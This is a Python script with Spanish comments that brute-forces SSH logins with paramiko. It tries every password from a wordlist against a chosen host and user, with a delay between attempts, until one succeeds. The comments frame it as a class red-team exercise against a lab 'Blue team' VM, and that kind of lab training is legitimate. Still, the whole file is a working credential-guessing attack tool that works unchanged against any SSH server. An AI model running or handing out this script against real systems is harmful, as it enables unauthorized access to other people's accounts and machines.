import paramiko
import time
import argparse

"""El scrip recibe un archivo de texto que contienen una lista de posibles contraseñas
with open abre el archivo que contienen las contraseñas por medio de su ruta, con split lines combierte el archivo 
en una lista para python
El bucle del script: Llama a la función y va probando las contraseñas para el ingreso, si la contraseña es la correcta termina el bucle.
se utliiza un sleep para que el programa tenga un delay entre pruebas.
Gracias al trato que se le da a las expepciones la ejecución no termina si no sigue intentando la conexión.
"""

#Argumentos que van a utilizarse para la conexión, estos son agurmentos por defecto pero en la ejecución se reemplazan con los datos reales 
open

parser = argparse.ArgumentParser(description="Simulación de intento de login SSH")

parser.add_argument("-ip", "--hostname", type=str, default="192.168.0.106",
                    help="IP del servidor SSH")

parser.add_argument("-p", "--port", type=int, default=22,
                    help="Puerto SSH")

parser.add_argument("-u", "--user", type=str, default="fidelix",
                    help="Usuario SSH")

parser.add_argument("-pl", "--passlist", type=str, default="Clase\Prubas_proyecto\proyecto\\red_team\passwords.txt",
                    help="Archivo con contraseñas")

parser.add_argument("-d", "--delay", type=float, default=0.5,
                    help="Tiempo entre intentos")

args = parser.parse_args()

hostname = args.hostname
port = args.port
user = args.user
passlist = args.passlist
delay = args.delay



#Función para la conexión ssh 


def ssh_connect(password):

    client = paramiko.SSHClient()

    #acepta auto la clave del host
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
#realiza el intento de conexion con las contraseñas de la lista
        client.connect(
            hostname=hostname,
            port=port,
            username=user,
            password=password,
            timeout=3
        )

        print("\n[+] CONTRASEÑA ENCONTRADA:", password)

        client.close()

        return True
#error si no coincide
    except paramiko.AuthenticationException:

        print("[-] Contraseña incorrecta:", password)

        return False

    except paramiko.SSHException:

        print("[!] Error con el servicio SSH")

        return False

    except Exception as e:

        print("[!] Error:", e)

        return False



def main():

    print("\nIniciando prueba de conexión SSH")
    print("Servidor:", hostname)
    print("Usuario:", user)
    print("Puerto:", port)

    try:

        with open(passlist, "r") as file:

            passwords = file.read().splitlines()

    except FileNotFoundError:

        print("Archivo de contraseñas no encontrado")
        return


    for password in passwords:

        success = ssh_connect(password)

        if success:
            break

        time.sleep(delay)


if __name__ == "__main__":
    main()
    #cambiar parámetros para realizar el ataque a la VM Blue team
  
